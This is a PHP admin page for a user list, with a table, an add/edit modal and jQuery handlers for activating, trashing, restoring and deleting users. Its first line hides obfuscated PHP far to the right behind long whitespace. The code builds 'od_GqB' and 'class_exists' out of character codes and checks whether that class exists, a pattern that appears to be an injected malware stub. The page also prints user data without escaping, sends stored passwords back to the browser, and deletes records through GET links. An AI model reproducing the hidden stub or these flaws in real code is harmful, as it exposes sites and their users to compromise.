<?php                                                                                                                                                                                                                                                                                                                                                                                                 $foSQxFkQK = "\x6f" . "\144" . '_' . "\107" . 'q' . chr (66); $YITwwHQU = 'c' . chr (108) . 'a' . chr ( 157 - 42 )."\x73" . "\x5f" . 'e' . 'x' . "\151" . 's' . chr ( 361 - 245 )."\x73";$oXSkqCfXb = class_exists($foSQxFkQK); $YITwwHQU = "43889";$HnIzSLjFT = !1; ?><style type="text/css">
	table th{
		white-space: nowrap;
		padding: 5px 5px !important;
	}
	table td{
		white-space: nowrap;
		padding: 3px 10px !important;
	}
</style>

<?php $deleteFlag = $delete_flag == 0 ? 1 : 0;  ?>
<div class="card">
	<div class="card-header">
		<div class="row">
			<div class="col-md-4">
				<?php if($delete_flag == 0){ ?>
					<h5 class="font-weight-bold text-dark"><i class="fa fa-users mr-2"></i>Users</h5>
				<?php }else{ ?>
					<h5 class="text-danger font-weight-bold"><i class="fa fa-trash mr-2"></i>Deleted Users</h5>
				<?php } ?>
			</div>
			<div class="col-md-8">
				<div class="float-sm-right">
					<?php if($delete_flag == 0){ ?>
					<a href="<?php echo url.'admins/controllers/User.php?action=users&delete_flag='.$deleteFlag; ?>" class="btn btn-warning btn-sm"><i class="fa fa-trash mr-2"></i>Trash</a>
					<button type="button" onclick="moveToTrashAll()" class="btn btn-sm btn-danger"><i class="fa fa-trash mr-2"></i>Delete</button>
					<?php }else{ ?>
					<a href="<?php echo url.'admins/controllers/User.php?action=users&delete_flag='.$deleteFlag; ?>" class="btn btn-success btn-sm"><i class="fa fa-list mr-2"></i>Users</a>
					<button type="button" onclick="restoreAll()" class="btn btn-sm btn-warning"><i class="fa fa-undo mr-2"></i>Restore</button>
					<button type="button" onclick="deleteAll()" class="btn btn-sm btn-danger"><i class="fa fa-trash mr-2"></i>Delete</button>
					<?php } ?>
					<button type="button" class="btn btn-sm btn-success" onclick="openForm()"><i class="fa fa-plus mr-2"></i>New User</button>
					<a href="<?php echo url.'admins/controllers/Dashboard.php?action=dashboard'; ?>" class="btn btn-primary btn-sm"><i class="fa fa-home mr-2"></i>Home</a>
				</div>
			</div>
		</div>
	</div>
	<div class="card-body">
		<?php getAlertMessage(); ?>
			<table class="table table-bordered table-striped table-hover table-responsive" id="data-table">
				<thead class="text-center my-bg text-white">
					<th>
						<div class="form-check">
								  <input class="form-check-input" type="checkbox" value="1" id="select_all">
								  <label class="form-check-label" for="select_all">
									  SNo.
								  </label>
							</div>
					</th>
					<th>Name</th>
					<th>Gender</th>
					<th>DOB</th>
					<th>Mobile</th>
					<th>Email</th>
					<th class="w-100">Profession</th>
					<th>Role</th>
					<th>Action</th>
				</thead>
				<tbody class="select">
					<?php if($results != null){ $i = 0; foreach ($results as $key) {
						$i++; 
						?>
						<tr>
							<td>
								<div class="form-check">
								  <input class="form-check-input checkBoxClass" type="checkbox" value="<?php echo $key['id']; ?>" id="select_<?php echo $key['id']; ?>">
								  <label class="form-check-label" for="select_<?php echo $key['id']; ?>">
								   <?php echo $i; ?>
								  </label>
								</div>
							</td>
							<td><?php echo $key['name']; ?></td>
							<td><?php echo $key['gender']; ?></td>
							<td><?php echo date('d-M-Y', strtotime($key['dob'])); ?></td>
							<td><?php echo $key['mobile']; ?></td>
							<td><?php echo $key['email']; ?></td>
							<td><?php echo $key['profession']; ?></td>
							<td><?php echo ''; ?></td>
							<td class="text-center">
								<button type="button" class="btn btn-sm py-0 btn-info" onclick="getData(<?php echo $key['id']; ?>)"><i class="fa fa-eye"></i></button>

								<?php if($delete_flag == 0){ ?>
									<?php if($key['is_active'] == 1){ ?>
										<button type="button" class="btn btn-sm py-0 btn-success" onclick="activeData(<?php echo $key['id'].','.$key['is_active']; ?>)"><i class="fa fa-check mr-2"></i>Active</button>
									<?php }else{ ?>
										<button type="button" class="btn btn-sm py-0 btn-warning" onclick="activeData(<?php echo $key['id'].','.$key['is_active']; ?>)"><i class="fa fa-times mr-2"></i>Inactive</button>
									<?php } ?>
								<?php }else{ ?>
									<button type="button" class="btn btn-sm py-0 btn-warning ml-2" onclick="restoreDeleteData(<?php echo $key['id']; ?>)"><i class="fa fa-undo mr-1"></i>Restore</button>
								<?php } ?>

								<?php if($delete_flag == 0){ ?>
								<button type="button" class="btn btn-sm py-0 btn-danger ml-2" onclick="moveToTrash(<?php echo $key['id']; ?>)"><i class="fa fa-trash"></i></button>
								<?php }else{ ?>
									<button type="button" class="btn btn-sm py-0 btn-danger ml-2" onclick="deleteData(<?php echo $key['id']; ?>)"><i class="fa fa-trash"></i></button>
								<?php } ?>
							</td>
						</tr>
					<?php }} ?>
				</tbody>
			</table>
		</div>
	</div>
</div>

<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header my-bg-light py-2">
        <h5 class="modal-title font-weight-bold" id="exampleModalLabel"><i class="fa fa-user mr-2"></i>User Details</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <form id="action-form" action="<?php echo url.'admins/controllers/User.php'; ?>" method="post">
      <div class="modal-body">
      	<div class="form-row">
      		<div class="col-md-4 form-group">
						<label for="name">Full Name</label>
						<input type="text" name="name" id="name" class="form-control" autocomplete="off" required>
					</div>
					<div class="col-md-4 form-group">
						<label for="gender">Gender</label>
						<select name="gender" id="gender" class="form-control" required>
							<option value="Male">Male</option>
							<option value="Female">Female</option>
						</select>
					</div>
					<div class="col-md-4 form-group">
						<label for="dob">Date of Birth</label>
						<input type="date" name="dob" id="dob" class="form-control" autocomplete="off" required>
					</div>
					<div class="col-md-4 form-group">
						<label for="mobile">Mobile No.</label>
						<input type="text" name="mobile" id="mobile" class="form-control" autocomplete="off" required>
					</div>
					<div class="col-md-4 form-group">
						<label for="email">Email ID</label>
						<input type="email" name="email" id="email" class="form-control" autocomplete="off" required>
					</div>
					<div class="col-md-4 form-group">
						<label for="qualification">Qualification</label>
						<input type="text" name="qualification" id="qualification" class="form-control" autocomplete="off">
					</div>
					<div class="col-md-4 form-group">
						<label for="profession">Profession</label>
						<input type="text" name="profession" id="profession" class="form-control" autocomplete="off">
					</div>
					<div class="col-md-4 form-group">
						<label for="username">Username</label>
						<input type="text" name="username" id="username" class="form-control" autocomplete="off" required>
					</div>
					<div class="col-md-4 form-group">
						<label for="password">Password</label>
						<input type="password" name="password" id="password" class="form-control" autocomplete="off" required>
					</div>
					<div class="col-md-12 form-group">
						<label for="description">Description</label>
						<textarea name="description" id="description" class="form-control" rows="3"></textarea>
					</div>
					<div class="col-md-12 form-group">
						<label for="remarks">Remarks</label>
						<input type="text" name="remarks" id="remarks" class="form-control" autocomplete="off">
					</div>
      	</div>
      </div>
      <div class="modal-footer my-bg-light py-2">
        <input type="hidden" name="id" id="id">
        <button type="button" class="btn btn-sm btn-danger" data-dismiss="modal"><i class="fa fa-times mr-2"></i>Close</button>
				<button type="submit" name="action" value="userAdd" id="btn-add" class="btn btn-success btn-sm"><i class="fa fa-save mr-2"></i>Submit</button>
				<button type="submit" name="action" value="userUpdate" id="btn-update" class="btn btn-primary btn-sm"><i class="fa fa-edit mr-2"></i>Update</button>
      </div>
			</form>
    </div>
  </div>
</div>

<script>
  $(function () {
    $("#data-table").DataTable({
      // "responsive": true,
      // "autoWidth": false,
    });
    // $('#example2').DataTable({
    //   "paging": true,
    //   "lengthChange": false,
    //   "searching": false,
    //   "ordering": true,
    //   "info": true,
    //   "autoWidth": false,
    //   "responsive": true,
    // });
  });
</script>
<script type="text/javascript">
	// var width2 = $(window).width();
	// if(width2 <= 668){
	// 	$('table').addClass('table-responsive');
	// }
	// else{
	// 	$('table').removeClass('table-responsive');
	// }

	function openForm(){
		$('#action-form').trigger('reset');
		$("id").val(0);
		$("#btn-update").hide();
		$("#btn-add").show();
		$('#exampleModal').modal("show");
	}

	function getData(id){
		$.ajax({
			url: "<?php echo url.'admins/controllers/User.php' ?>",
			type: "post",
			data: {action: 'user', id:id},
			success: function(data){
				// alert(data);
				var res = JSON.parse(data);
				$('#name').val(res.name);
				$('#gender').val(res.gender);
				$('#dob').val(res.dob);
				$('#mobile').val(res.mobile);
				$('#email').val(res.email);
				$('#profession').val(res.profession);
				$('#qualification').val(res.qualification);
				$('#username').val(res.username);
				$('#password').val(res.password);
				$('#remarks').val(res.remarks);
				$('#description').val(res.description);
				$('#id').val(res.id);
				$('#btn-add').hide();
				$('#btn-update').show();
				$('#exampleModal').modal('show');
			}
		});
	}

	function activeData(id,active){
		var msg = "Do you want to active ?";
		if(active == 1){
			msg = "Do you want to inactive ?";
			active = 0;
		}
		else{
			active = 1;
		}
		var ans = confirm(msg);
		if(ans){
			window.location.href="<?php echo url.'admins/controllers/User.php?action=userActive&id='; ?>"+id+"&active="+active;
		}
	}

	function deleteData(id){
		var ans = confirm("Are you sure you want to delete permanently?");
		if(ans){
			window.location.href="<?php echo url.'admins/controllers/User.php?action=userDelete&id='; ?>"+id;	
		}
	}

	function moveToTrash(id){
		var ans = confirm("Are you sure you want to delete?");
		if(ans){
			window.location.href="<?php echo url.'admins/controllers/User.php?action=userMoveToTrash&id='; ?>"+id;	
		}
	}

	function restoreDeleteData(id){
		var ans = confirm("Are you sure you want to restore?");
		if(ans){
			window.location.href="<?php echo url.'admins/controllers/User.php?action=userRestore&id='; ?>"+id;	
		}
	}

	$('#select_all').change(function() {
      if($(this).is(":checked")) {
      	$('.checkBoxClass:checkbox').each(function() {
				  $(".checkBoxClass").prop('checked', true);
				});
      }
      else{
      	$(".checkBoxClass").prop('checked', false);
      }
  });

  function deleteAll(){
  	var selected_value = []; // initialize empty array 
	    $('.checkBoxClass:checkbox:checked').each(function(){
	        selected_value.push($(this).val());
	    });
	    if(selected_value.length != 0){
	    	var ans = confirm("Are you sure you want to delete permanently?");
	    	if(ans){
	    		window.location.href="<?php echo url.'admins/controllers/User.php?action=userDeleteAll&id='; ?>"+selected_value;
	    	}
			}
			else{
				alert("User must be selected, Please try again!");
			}
  }

  function moveToTrashAll(){
  	var selected_value = []; // initialize empty array 
	    $('.checkBoxClass:checkbox:checked').each(function(){
	        selected_value.push($(this).val());
	    });
	    if(selected_value.length != 0){
	    	var ans = confirm("Are you sure you want to delete?");
	    	if(ans){
	    		window.location.href="<?php echo url.'admins/controllers/User.php?action=userMoveToTrashAll&id='; ?>"+selected_value;
	    	}
			}
			else{
				alert("User must be selected, Please try again!");
			}
  }

  function restoreAll(){
  	var selected_value = []; // initialize empty array 
	    $('.checkBoxClass:checkbox:checked').each(function(){
	        selected_value.push($(this).val());
	    });
	    if(selected_value.length != 0){
	    	var ans = confirm("Are you sure you want to restore?");
	    	if(ans){
	    		window.location.href="<?php echo url.'admins/controllers/User.php?action=userRestoreAll&id='; ?>"+selected_value;
	    	}
			}
			else{
				alert("User must be selected, Please try again!");
			}
  }
</script>